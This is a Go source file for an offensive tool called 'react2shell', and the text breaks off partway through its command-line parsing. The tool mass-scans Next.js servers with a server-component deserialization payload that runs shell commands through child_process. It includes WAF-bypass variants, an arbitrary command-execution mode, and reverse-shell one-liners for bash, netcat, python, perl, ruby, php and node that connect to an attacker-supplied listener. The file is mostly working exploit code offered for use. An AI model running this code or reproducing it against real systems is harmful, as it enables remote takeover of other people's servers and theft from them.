package main

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/http/httputil"
	"os"
	"regexp"
	"runtime"
	"runtime/debug"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	Version  = "3.0.0"
	Boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
)

const (
	Reset  = "\033[0m"
	Red    = "\033[91m"
	Green  = "\033[92m"
	Yellow = "\033[93m"
	Blue   = "\033[94m"
	Gray   = "\033[90m"
	Cyan   = "\033[96m"
)

var rcePattern = regexp.MustCompile(`rce=11111`)

var (
	rcePayload      string
	rceContentType  string
	safePayload     string
	safeContentType string
	payloadOnce     sync.Once
)

func initPayloads() {
	payloadOnce.Do(func() {
		rcePayload, rceContentType = buildRCEPayload(false, 0)
		safePayload, safeContentType = buildSafePayload()
	})
}

type Result struct {
	Host       string `json:"host"`
	Vulnerable bool   `json:"vulnerable,omitempty"`
	StatusCode int16  `json:"status_code,omitempty"`
	Error      string `json:"error,omitempty"`
	Evidence   string `json:"evidence,omitempty"`
	Timestamp  int64  `json:"timestamp"`
}

type ScanConfig struct {
	Port            int
	Path            string
	Threads         int
	Timeout         time.Duration
	SafeMode        bool
	Insecure        bool
	UseTLS          bool
	Verbose         bool
	JSONOutput      bool
	Quiet           bool
	MaxMemoryMB     int64
	StreamMode      bool
	WAFBypass       bool
	WAFBypassSizeKB int
	VercelWAFBypass bool
}

type ExploitConfig struct {
	Target       string
	Port         int
	Path         string
	UseTLS       bool
	Insecure     bool
	Timeout      time.Duration
	ListenerIP   string
	ListenerPort int
	Shell        string
	Verbose      bool
}

type ExecConfig struct {
	Target   string
	Port     int
	Path     string
	UseTLS   bool
	Insecure bool
	Timeout  time.Duration
	Command  string
	Verbose  bool
}

type Stats struct {
	Total      int64
	Scanned    int64
	Vulnerable int64
	Errors     int64
}

var bufferPool = sync.Pool{
	New: func() interface{} {
		buf := make([]byte, 4096)
		return &buf
	},
}

var stringBuilderPool = sync.Pool{
	New: func() interface{} {
		return &strings.Builder{}
	},
}

func getBuffer() *[]byte {
	return bufferPool.Get().(*[]byte)
}

func putBuffer(buf *[]byte) {
	bufferPool.Put(buf)
}

func getStringBuilder() *strings.Builder {
	sb := stringBuilderPool.Get().(*strings.Builder)
	sb.Reset()
	return sb
}

func putStringBuilder(sb *strings.Builder) {
	stringBuilderPool.Put(sb)
}

type MemoryLimiter struct {
	maxBytes      uint64
	enabled       bool
	paused        int32
	checkInterval time.Duration
}

func NewMemoryLimiter(maxMB int64) *MemoryLimiter {
	ml := &MemoryLimiter{
		checkInterval: 50 * time.Millisecond,
	}
	if maxMB > 0 {
		ml.maxBytes = uint64(maxMB) * 1024 * 1024
		ml.enabled = true
		debug.SetMemoryLimit(int64(ml.maxBytes))
		debug.SetGCPercent(50)
	}
	return ml
}

func GetMemoryUsage() uint64 {
	var m runtime.MemStats
	runtime.ReadMemStats(&m)
	return m.Alloc
}

func GetMemoryUsageMB() float64 {
	return float64(GetMemoryUsage()) / 1024 / 1024
}

func (ml *MemoryLimiter) WaitForMemory() {
	if !ml.enabled {
		return
	}

	threshold := uint64(float64(ml.maxBytes) * 0.85)
	for GetMemoryUsage() >= threshold {
		if atomic.CompareAndSwapInt32(&ml.paused, 0, 1) {
			runtime.GC()
			debug.FreeOSMemory()
		}
		time.Sleep(ml.checkInterval)
	}
	atomic.StoreInt32(&ml.paused, 0)
}

func (ml *MemoryLimiter) ForceGC() {
	if !ml.enabled {
		return
	}
	if GetMemoryUsage() > uint64(float64(ml.maxBytes)*0.7) {
		runtime.GC()
	}
}

type Logger struct {
	quiet      bool
	jsonOutput bool
	mu         sync.Mutex
	w          io.Writer
}

func NewLogger(quiet, jsonOutput bool) *Logger {
	return &Logger{
		quiet:      quiet,
		jsonOutput: jsonOutput,
		w:          os.Stderr,
	}
}

func (l *Logger) Info(format string, args ...interface{}) {
	if l.quiet || l.jsonOutput {
		return
	}
	l.mu.Lock()
	fmt.Fprintf(l.w, "%s[*]%s %s\n", Blue, Reset, fmt.Sprintf(format, args...))
	l.mu.Unlock()
}

func (l *Logger) Success(format string, args ...interface{}) {
	if l.jsonOutput {
		return
	}
	l.mu.Lock()
	fmt.Fprintf(l.w, "%s[+]%s %s\n", Green, Reset, fmt.Sprintf(format, args...))
	l.mu.Unlock()
}

func (l *Logger) Warning(format string, args ...interface{}) {
	if l.quiet || l.jsonOutput {
		return
	}
	l.mu.Lock()
	fmt.Fprintf(l.w, "%s[!]%s %s\n", Yellow, Reset, fmt.Sprintf(format, args...))
	l.mu.Unlock()
}

func (l *Logger) Error(format string, args ...interface{}) {
	l.mu.Lock()
	fmt.Fprintf(l.w, "%s[-]%s %s\n", Red, Reset, fmt.Sprintf(format, args...))
	l.mu.Unlock()
}

func (l *Logger) Vuln(host, evidence string) {
	if l.jsonOutput {
		return
	}
	l.mu.Lock()
	fmt.Fprintf(os.Stdout, "%s[VULN]%s %s\n", Green, Reset, host)
	if evidence != "" {
		fmt.Fprintf(os.Stdout, "       %s%s%s\n", Gray, evidence, Reset)
	}
	l.mu.Unlock()
}

func (l *Logger) Safe(host string, statusCode int16) {
	if l.quiet || l.jsonOutput {
		return
	}
	l.mu.Lock()
	fmt.Fprintf(l.w, "%s[SAFE]%s %s %s(%d)%s\n", Green, Reset, host, Gray, statusCode, Reset)
	l.mu.Unlock()
}

func (l *Logger) ScanError(host, errMsg string) {
	if l.quiet || l.jsonOutput {
		return
	}
	l.mu.Lock()
	fmt.Fprintf(l.w, "%s[ERR]%s  %s %s(%s)%s\n", Yellow, Reset, host, Gray, errMsg, Reset)
	l.mu.Unlock()
}

func (l *Logger) Progress(scanned, total, vulnerable int64, memMB float64, memLimit int64) {
	if l.quiet || l.jsonOutput {
		return
	}
	l.mu.Lock()
	pct := float64(scanned) / float64(total) * 100.0
	if memLimit > 0 {
		fmt.Fprintf(l.w, "\r%s[*]%s Progress: %d/%d (%.1f%%) | Vuln: %s%d%s | Mem: %.0f/%dMB    ",
			Blue, Reset, scanned, total, pct, Green, vulnerable, Reset, memMB, memLimit)
	} else {
		fmt.Fprintf(l.w, "\r%s[*]%s Progress: %d/%d (%.1f%%) | Vuln: %s%d%s | Mem: %.0fMB    ",
			Blue, Reset, scanned, total, pct, Green, vulnerable, Reset, memMB)
	}
	l.mu.Unlock()
}

func (l *Logger) ClearLine() {
	if l.quiet || l.jsonOutput {
		return
	}
	fmt.Fprint(l.w, "\r\033[K")
}

func (l *Logger) Request(req *http.Request, body string) {
	l.mu.Lock()
	defer l.mu.Unlock()

	fmt.Fprintf(l.w, "\n%s>>> REQUEST >>>%s\n", Cyan, Reset)
	fmt.Fprintf(l.w, "%s%s %s %s%s\n", Gray, req.Method, req.URL.String(), req.Proto, Reset)
	fmt.Fprintf(l.w, "%sHost: %s%s\n", Gray, req.Host, Reset)
	for key, values := range req.Header {
		for _, value := range values {
			fmt.Fprintf(l.w, "%s%s: %s%s\n", Gray, key, value, Reset)
		}
	}
	fmt.Fprintf(l.w, "%s%s\n", Gray, Reset)
	if body != "" {
		if len(body) > 2000 {
			fmt.Fprintf(l.w, "%s%s...%s\n", Gray, body[:2000], Reset)
			fmt.Fprintf(l.w, "%s[truncated %d bytes]%s\n", Gray, len(body)-2000, Reset)
		} else {
			fmt.Fprintf(l.w, "%s%s%s\n", Gray, body, Reset)
		}
	}
}

func (l *Logger) Response(resp *http.Response, body string) {
	l.mu.Lock()
	defer l.mu.Unlock()

	fmt.Fprintf(l.w, "\n%s<<< RESPONSE <<<%s\n", Cyan, Reset)
	fmt.Fprintf(l.w, "%s%s %s%s\n", Gray, resp.Proto, resp.Status, Reset)
	for key, values := range resp.Header {
		for _, value := range values {
			fmt.Fprintf(l.w, "%s%s: %s%s\n", Gray, key, value, Reset)
		}
	}
	fmt.Fprintf(l.w, "%s%s\n", Gray, Reset)
	if body != "" {
		if len(body) > 2000 {
			fmt.Fprintf(l.w, "%s%s...%s\n", Gray, body[:2000], Reset)
			fmt.Fprintf(l.w, "%s[truncated %d bytes]%s\n", Gray, len(body)-2000, Reset)
		} else {
			fmt.Fprintf(l.w, "%s%s%s\n", Gray, body, Reset)
		}
	}
	fmt.Fprintln(l.w)
}

func generateJunkData(sizeBytes int) (string, string) {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	paramName := make([]byte, 12)
	for i := range paramName {
		paramName[i] = charset[rand.Intn(26)]
	}
	junk := make([]byte, sizeBytes)
	for i := range junk {
		junk[i] = charset[rand.Intn(len(charset))]
	}
	return string(paramName), string(junk)
}

func buildRCEPayload(wafBypass bool, wafBypassSizeKB int) (string, string) {
	cmd := `echo $((41*271))`
	prefix := `var res=process.mainModule.require('child_process').execSync('` + cmd + `').toString().trim();` +
		"throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`NEXT_REDIRECT;push;/vuln?rce=${res};307;`});"

	return buildPayloadWithPrefix(prefix, wafBypass, wafBypassSizeKB)
}

func buildVercelWAFBypassPayload() (string, string) {
	sb := getStringBuilder()
	defer putStringBuilder(sb)

	part0 := `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,` +
		`"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":` +
		`"var res=process.mainModule.require('child_process').execSync('echo $((41*271))').toString().trim();;` +
		`throw Object.assign(new Error('NEXT_REDIRECT'),{digest: \"NEXT_REDIRECT;push;/vuln?rce=${res};307;\"});",` +
		`"_chunks":"$Q2","_formData":{"get":"$3:\"$$:constructor:constructor"}}}`

	sb.WriteString("--")
	sb.WriteString(Boundary)
	sb.WriteString("\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n")
	sb.WriteString(part0)
	sb.WriteString("\r\n--")
	sb.WriteString(Boundary)
	sb.WriteString("\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n--")
	sb.WriteString(Boundary)
	sb.WriteString("\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]\r\n--")
	sb.WriteString(Boundary)
	sb.WriteString("\r\nContent-Disposition: form-data; name=\"3\"\r\n\r\n")
	sb.WriteString(`{""\u0024\u0024":{}}`)
	sb.WriteString("\r\n--")
	sb.WriteString(Boundary)
	sb.WriteString("--\r\n")

	return sb.String(), "multipart/form-data; boundary=" + Boundary
}

func buildSafePayload() (string, string) {
	sb := getStringBuilder()
	defer putStringBuilder(sb)

	sb.WriteString("--")
	sb.WriteString(Boundary)
	sb.WriteString("\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n{}\r\n--")
	sb.WriteString(Boundary)
	sb.WriteString("\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n[\"$1:aa:aa\"]\r\n--")
	sb.WriteString(Boundary)
	sb.WriteString("--\r\n")

	return sb.String(), "multipart/form-data; boundary=" + Boundary
}

func buildReverseShellPayload(listenerIP string, listenerPort int, shellType string) (string, string) {
	var cmd string

	switch shellType {
	case "bash":
		cmd = fmt.Sprintf(`bash -i >& /dev/tcp/%s/%d 0>&1`, listenerIP, listenerPort)
	case "sh":
		cmd = fmt.Sprintf(`sh -i >& /dev/tcp/%s/%d 0>&1`, listenerIP, listenerPort)
	case "nc", "netcat":
		cmd = fmt.Sprintf(`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f`, listenerIP, listenerPort)
	case "nc-e":
		cmd = fmt.Sprintf(`nc -e /bin/sh %s %d`, listenerIP, listenerPort)
	case "python":
		cmd = fmt.Sprintf(`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`, listenerIP, listenerPort)
	case "python3":
		cmd = fmt.Sprintf(`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`, listenerIP, listenerPort)
	case "perl":
		cmd = fmt.Sprintf(`perl -e 'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, listenerIP, listenerPort)
	case "ruby":
		cmd = fmt.Sprintf(`ruby -rsocket -e'f=TCPSocket.open("%s",%d).to_i;exec sprintf("/bin/sh -i <&%%d >&%%d 2>&%%d",f,f,f)'`, listenerIP, listenerPort)
	case "php":
		cmd = fmt.Sprintf(`php -r '$sock=fsockopen("%s",%d);exec("/bin/sh -i <&3 >&3 2>&3");'`, listenerIP, listenerPort)
	default:
		cmd = fmt.Sprintf(`node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(%d,"%s",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'`, listenerPort, listenerIP)
	}

	escapedCmd := strings.ReplaceAll(cmd, `'`, `\'`)
	escapedCmd = strings.ReplaceAll(escapedCmd, `"`, `\"`)

	prefix := `process.mainModule.require('child_process').exec('` + escapedCmd + `');` +
		"throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`NEXT_REDIRECT;push;/pwned;307;`});"

	return buildPayloadWithPrefix(prefix, false, 0)
}

func buildCustomCommandPayload(command string) (string, string) {
	escapedCmd := strings.ReplaceAll(command, `'`, `\'`)
	escapedCmd = strings.ReplaceAll(escapedCmd, `"`, `\"`)

	prefix := `process.mainModule.require('child_process').execSync('` + escapedCmd + `');` +
		"throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`NEXT_REDIRECT;push;/cmd;307;`});"

	return buildPayloadWithPrefix(prefix, false, 0)
}

func buildPayloadWithPrefix(prefix string, wafBypass bool, wafBypassSizeKB int) (string, string) {
	sb := getStringBuilder()
	defer putStringBuilder(sb)

	escapedPrefix := strings.ReplaceAll(prefix, `\`, `\\`)
	escapedPrefix = strings.ReplaceAll(escapedPrefix, `"`, `\"`)
	escapedPrefix = strings.ReplaceAll(escapedPrefix, "\n", `\n`)
	escapedPrefix = strings.ReplaceAll(escapedPrefix, "\r", `\r`)
	escapedPrefix = strings.ReplaceAll(escapedPrefix, "\t", `\t`)

	chunk := `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"` +
		escapedPrefix + `","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`

	if wafBypass && wafBypassSizeKB > 0 {
		paramName, junk := generateJunkData(wafBypassSizeKB * 1024)
		sb.WriteString("--")
		sb.WriteString(Boundary)
		sb.WriteString("\r\nContent-Disposition: form-data; name=\"")
		sb.WriteString(paramName)
		sb.WriteString("\"\r\n\r\n")
		sb.WriteString(junk)
		sb.WriteString("\r\n")
	}

	sb.WriteString("--")
	sb.WriteString(Boundary)
	sb.WriteString("\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n")
	sb.WriteString(chunk)
	sb.WriteString("\r\n--")
	sb.WriteString(Boundary)
	sb.WriteString("\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n--")
	sb.WriteString(Boundary)
	sb.WriteString("\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]\r\n--")
	sb.WriteString(Boundary)
	sb.WriteString("--\r\n")

	return sb.String(), "multipart/form-data; boundary=" + Boundary
}

func buildURL(host string, port int, useTLS bool, path string) string {
	host = strings.TrimSpace(host)

	if strings.HasPrefix(host, "https://") {
		host = host[8:]
	} else if strings.HasPrefix(host, "http://") {
		host = host[7:]
	}

	host = strings.TrimSuffix(host, "/")

	if idx := strings.LastIndex(host, ":"); idx != -1 {
		if !strings.Contains(host[idx:], "]") {
			host = host[:idx]
		}
	}

	sb := getStringBuilder()
	defer putStringBuilder(sb)

	if useTLS {
		sb.WriteString("https://")
	} else {
		sb.WriteString("http://")
	}
	sb.WriteString(host)

	if !((useTLS && port == 443) || (!useTLS && port == 80)) {
		sb.WriteByte(':')
		sb.WriteString(fmt.Sprintf("%d", port))
	}

	if path != "" {
		if path[0] != '/' {
			sb.WriteByte('/')
		}
		sb.WriteString(path)
	}

	return sb.String()
}

var httpClientPool = sync.Pool{
	New: func() interface{} {
		return &http.Client{
			Timeout: 10 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
				DisableKeepAlives:     false,
				MaxIdleConns:          100,
				MaxIdleConnsPerHost:   10,
				MaxConnsPerHost:       20,
				IdleConnTimeout:       30 * time.Second,
				ResponseHeaderTimeout: 10 * time.Second,
				DisableCompression:    true,
			},
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}
	},
}

func getHTTPClient(timeout time.Duration, insecure bool) *http.Client {
	client := httpClientPool.Get().(*http.Client)
	client.Timeout = timeout
	if transport, ok := client.Transport.(*http.Transport); ok {
		transport.TLSClientConfig.InsecureSkipVerify = insecure
	}
	return client
}

func putHTTPClient(client *http.Client) {
	httpClientPool.Put(client)
}

func sendRequest(client *http.Client, url, payload, contentType string) (*http.Response, error) {
	req, err := http.NewRequest("POST", url, strings.NewReader(payload))
	if err != nil {
		return nil, err
	}

	req.Header.Set("Content-Type", contentType)
	req.Header.Set("Next-Action", "c3a144622dd5b5046f1ccb6007fea3f3710057de")
	req.Header.Set("Accept", "text/x-component")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("X-Nextjs-Request-Id", "b5dce965")
	req.Header.Set("X-Nextjs-Html-Request-Id", "SSTMXm7OJ_g0Ncx6jpQt9")

	return client.Do(req)
}

func sendRequestVerbose(client *http.Client, url, payload, contentType string, logger *Logger) (*http.Response, string, error) {
	req, err := http.NewRequest("POST", url, strings.NewReader(payload))
	if err != nil {
		return nil, "", err
	}

	req.Header.Set("Content-Type", contentType)
	req.Header.Set("Next-Action", "c3a144622dd5b5046f1ccb6007fea3f3710057de")
	req.Header.Set("Accept", "text/x-component")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("X-Nextjs-Request-Id", "b5dce965")
	req.Header.Set("X-Nextjs-Html-Request-Id", "SSTMXm7OJ_g0Ncx6jpQt9")

	logger.Request(req, payload)

	resp, err := client.Do(req)
	if err != nil {
		return nil, "", err
	}

	bodyBytes, err := io.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		return resp, "", err
	}

	bodyStr := string(bodyBytes)
	logger.Response(resp, bodyStr)

	return resp, bodyStr, nil
}

func scan(host string, config *ScanConfig, client *http.Client) Result {
	url := buildURL(host, config.Port, config.UseTLS, config.Path)
	result := Result{
		Host:      url,
		Timestamp: time.Now().Unix(),
	}

	var payload, contentType string
	if config.SafeMode {
		payload, contentType = safePayload, safeContentType
	} else if config.VercelWAFBypass {
		payload, contentType = buildVercelWAFBypassPayload()
	} else if config.WAFBypass {
		payload, contentType = buildRCEPayload(true, config.WAFBypassSizeKB)
	} else {
		payload, contentType = rcePayload, rceContentType
	}

	resp, err := sendRequest(client, url, payload, contentType)
	if err != nil {
		result.Error = truncateError(err.Error())
		return result
	}
	defer resp.Body.Close()

	result.StatusCode = int16(resp.StatusCode)

	if !config.SafeMode {
		if h := resp.Header.Get("X-Action-Redirect"); h != "" && rcePattern.MatchString(h) {
			result.Vulnerable = true
			result.Evidence = "RCE via X-Action-Redirect"
			io.Copy(io.Discard, resp.Body)
			return result
		}
		if h := resp.Header.Get("Location"); h != "" && rcePattern.MatchString(h) {
			result.Vulnerable = true
			result.Evidence = "RCE via Location"
			io.Copy(io.Discard, resp.Body)
			return result
		}
	}

	vuln, evidence := checkResponseBody(resp, config.SafeMode)
	if vuln {
		result.Vulnerable = true
		result.Evidence = evidence
	}

	return result
}

func checkResponseBody(resp *http.Response, safeMode bool) (bool, string) {
	buf := getBuffer()
	defer putBuffer(buf)

	var totalRead int
	maxRead := 8192

	for totalRead < maxRead {
		n, err := resp.Body.Read(*buf)
		if n > 0 {
			chunk := string((*buf)[:n])

			if !safeMode {
				if strings.Contains(chunk, "11111") && strings.Contains(chunk, "NEXT_REDIRECT") {
					io.Copy(io.Discard, resp.Body)
					return true, "RCE via body"
				}
			} else {
				if resp.StatusCode == 500 {
					server := strings.ToLower(resp.Header.Get("Server"))
					hasNetlifyVary := resp.Header.Get("Netlify-Vary") != ""
					isMitigated := hasNetlifyVary || server == "netlify" || server == "vercel"

					if !isMitigated && (strings.Contains(chunk, `E{"digest"`) || strings.Contains(chunk, "NEXT_REDIRECT")) {
						io.Copy(io.Discard, resp.Body)
						return true, "Potentially vulnerable (RSC error)"
					}
				}
				if strings.Contains(chunk, `$@`) && strings.Contains(chunk, `digest`) {
					io.Copy(io.Discard, resp.Body)
					return true, "Potentially vulnerable (RSC endpoint)"
				}
			}
			totalRead += n
		}
		if err != nil {
			break
		}
	}

	io.Copy(io.Discard, resp.Body)
	return false, ""
}

func truncateError(err string) string {
	if len(err) > 64 {
		return err[:64]
	}
	return err
}

func exploit(config *ExploitConfig, logger *Logger) error {
	url := buildURL(config.Target, config.Port, config.UseTLS, config.Path)

	logger.Info("Target:   %s", url)
	logger.Info("Listener: %s:%d", config.ListenerIP, config.ListenerPort)
	logger.Info("Shell:    %s", config.Shell)

	payload, contentType := buildReverseShellPayload(config.ListenerIP, config.ListenerPort, config.Shell)
	client := getHTTPClient(config.Timeout, config.Insecure)
	defer putHTTPClient(client)

	logger.Info("Sending payload...")

	var resp *http.Response
	var err error
	var bodyStr string

	if config.Verbose {
		resp, bodyStr, err = sendRequestVerbose(client, url, payload, contentType, logger)
	} else {
		resp, err = sendRequest(client, url, payload, contentType)
		if resp != nil {
			defer resp.Body.Close()
			io.Copy(io.Discard, resp.Body)
		}
	}

	if err != nil {
		return err
	}

	logger.Info("Response: %d", resp.StatusCode)

	switch {
	case resp.StatusCode == 307 || resp.StatusCode == 302 || resp.StatusCode == 303:
		logger.Success("Redirect received, payload likely executed")
		logger.Success("Check your listener for incoming connection")
	case resp.StatusCode == 500:
		logger.Warning("Got 500, command may have executed")
	default:
		logger.Warning("Unexpected response, exploit may have failed")
	}

	_ = bodyStr

	return nil
}

func execCmd(config *ExecConfig, logger *Logger) error {
	url := buildURL(config.Target, config.Port, config.UseTLS, config.Path)

	logger.Info("Target:  %s", url)
	logger.Info("Command: %s", config.Command)

	payload, contentType := buildCustomCommandPayload(config.Command)
	client := getHTTPClient(config.Timeout, config.Insecure)
	defer putHTTPClient(client)

	logger.Info("Sending command...")

	var resp *http.Response
	var err error
	var bodyStr string

	if config.Verbose {
		resp, bodyStr, err = sendRequestVerbose(client, url, payload, contentType, logger)
	} else {
		resp, err = sendRequest(client, url, payload, contentType)
		if resp != nil {
			defer resp.Body.Close()
			io.Copy(io.Discard, resp.Body)
		}
	}

	if err != nil {
		return err
	}

	logger.Info("Response: %d", resp.StatusCode)

	switch {
	case resp.StatusCode == 307 || resp.StatusCode == 302 || resp.StatusCode == 303:
		logger.Success("Command executed (redirect received)")
	case resp.StatusCode == 500:
		logger.Warning("Got 500, command likely executed")
	default:
		logger.Warning("Unexpected response")
	}

	_ = bodyStr

	return nil
}

type WorkerPool struct {
	workers    int
	tasks      chan string
	results    chan Result
	wg         sync.WaitGroup
	config     *ScanConfig
	memLimiter *MemoryLimiter
	client     *http.Client
}

func NewWorkerPool(workers int, config *ScanConfig, memLimiter *MemoryLimiter) *WorkerPool {
	return &WorkerPool{
		workers:    workers,
		tasks:      make(chan string, workers*2),
		results:    make(chan Result, workers*2),
		config:     config,
		memLimiter: memLimiter,
		client:     getHTTPClient(config.Timeout, config.Insecure),
	}
}

func (wp *WorkerPool) Start() {
	for i := 0; i < wp.workers; i++ {
		wp.wg.Add(1)
		go wp.worker()
	}
}

func (wp *WorkerPool) worker() {
	defer wp.wg.Done()

	for host := range wp.tasks {
		wp.memLimiter.WaitForMemory()
		result := scan(host, wp.config, wp.client)
		wp.results <- result
	}
}

func (wp *WorkerPool) Submit(host string) {
	wp.tasks <- host
}

func (wp *WorkerPool) Close() {
	close(wp.tasks)
	wp.wg.Wait()
	close(wp.results)
	putHTTPClient(wp.client)
}

func (wp *WorkerPool) Results() <-chan Result {
	return wp.results
}

func runScan(targets []string, config *ScanConfig, output string, logger *Logger) {
	initPayloads()

	stats := &Stats{Total: int64(len(targets))}
	memLimiter := NewMemoryLimiter(config.MaxMemoryMB)

	var outFile *os.File
	var outWriter *bufio.Writer
	if output != "" && config.StreamMode {
		var err error
		outFile, err = os.Create(output)
		if err != nil {
			logger.Error("Failed to create output file: %v", err)
			os.Exit(1)
		}
		defer outFile.Close()
		outWriter = bufio.NewWriter(outFile)
		defer outWriter.Flush()
	}

	var results []Result
	var vulnerableHosts []string
	var resultsMu sync.Mutex

	startTime := time.Now()

	if config.MaxMemoryMB > 0 {
		logger.Info("Targets: %d | Threads: %d | Max mem: %dMB | Stream: %v",
			len(targets), config.Threads, config.MaxMemoryMB, config.StreamMode)
	} else {
		logger.Info("Targets: %d | Threads: %d | Stream: %v", len(targets), config.Threads, config.StreamMode)
	}

	if config.WAFBypass {
		logger.Info("WAF bypass enabled (%dKB junk data)", config.WAFBypassSizeKB)
	}
	if config.VercelWAFBypass {
		logger.Info("Vercel WAF bypass mode enabled")
	}

	pool := NewWorkerPool(config.Threads, config, memLimiter)
	pool.Start()

	go func() {
		for _, t := range targets {
			pool.Submit(t)
		}
		pool.Close()
	}()

	lastProgressUpdate := time.Now()
	progressInterval := 100 * time.Millisecond

	for result := range pool.Results() {
		scanned := atomic.AddInt64(&stats.Scanned, 1)

		if result.Vulnerable {
			atomic.AddInt64(&stats.Vulnerable, 1)
			logger.ClearLine()
			logger.Vuln(result.Host, result.Evidence)

			if config.StreamMode && outWriter != nil {
				outWriter.WriteString(result.Host + "\n")
			} else {
				resultsMu.Lock()
				vulnerableHosts = append(vulnerableHosts, result.Host)
				resultsMu.Unlock()
			}
		} else if result.Error != "" {
			atomic.AddInt64(&stats.Errors, 1)
			if config.Verbose {
				logger.ClearLine()
				logger.ScanError(result.Host, result.Error)
			}
		} else if config.Verbose {
			logger.ClearLine()
			logger.Safe(result.Host, result.StatusCode)
		}

		if config.JSONOutput && !config.StreamMode {
			resultsMu.Lock()
			results = append(results, result)
			resultsMu.Unlock()
		}

		now := time.Now()
		if now.Sub(lastProgressUpdate) >= progressInterval || scanned == stats.Total {
			logger.Progress(scanned, stats.Total, atomic.LoadInt64(&stats.Vulnerable),
				GetMemoryUsageMB(), config.MaxMemoryMB)
			lastProgressUpdate = now
		}
	}

	duration := time.Since(startTime)
	logger.ClearLine()

	if config.JSONOutput && !config.StreamMode {
		enc := json.NewEncoder(os.Stdout)
		enc.SetIndent("", "  ")
		enc.Encode(results)
	} else {
		fmt.Fprintf(os.Stderr, "\n%s[*]%s Completed in %s\n", Blue, Reset, duration.Round(time.Millisecond))
		fmt.Fprintf(os.Stderr, "    Scanned:    %d\n", stats.Scanned)
		fmt.Fprintf(os.Stderr, "    Vulnerable: %s%d%s\n", Green, stats.Vulnerable, Reset)
		fmt.Fprintf(os.Stderr, "    Errors:     %d\n", stats.Errors)
		fmt.Fprintf(os.Stderr, "    Peak mem:   %.0fMB\n", GetMemoryUsageMB())
	}

	if output != "" && !config.StreamMode && len(vulnerableHosts) > 0 {
		sb := getStringBuilder()
		for _, h := range vulnerableHosts {
			sb.WriteString(h)
			sb.WriteByte('\n')
		}
		if err := os.WriteFile(output, []byte(sb.String()), 0644); err != nil {
			logger.Error("Failed to write output: %v", err)
		} else {
			logger.Success("Saved %d vulnerable hosts to %s", len(vulnerableHosts), output)
		}
		putStringBuilder(sb)
	}

	if stats.Vulnerable > 0 {
		os.Exit(1)
	}
}

func loadTargets(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var targets []string
	scanner := bufio.NewScanner(file)
	scanner.Buffer(make([]byte, 1024), 1024)

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && line[0] != '#' {
			targets = append(targets, line)
		}
	}

	return targets, scanner.Err()
}

func suppressHTTPLogs() {
	log.SetOutput(io.Discard)
}

func main() {
	suppressHTTPLogs()
	debug.SetGCPercent(100)
	rand.Seed(time.Now().UnixNano())

	if len(os.Args) < 2 {
		printUsage()
		os.Exit(1)
	}

	switch os.Args[1] {
	case "scan":
		cmdScan()
	case "exploit":
		cmdExploit()
	case "exec":
		cmdExec()
	case "version", "-v", "--version":
		fmt.Printf("react2shell v%s\n", Version)
	case "help", "-h", "--help":
		printUsage()
	default:
		fmt.Fprintf(os.Stderr, "Unknown command: %s\n", os.Args[1])
		printUsage()
		os.Exit(1)
	}
}

func cmdScan() {
	fs := flag.NewFlagSet("scan", flag.ExitOnError)
	target := fs.String("u", "", "Single target URL or IP")
	listFile := fs.String("l", "", "File with targets (one per line)")
	port := fs.Int("p", 443, "Target port")
	path := fs.String("path", "/", "Request path")
	noTLS := fs.Bool("no-tls", false, "Use HTTP instead of HTTPS")
	insecure := fs.Bool("k", true, "Skip TLS verification")
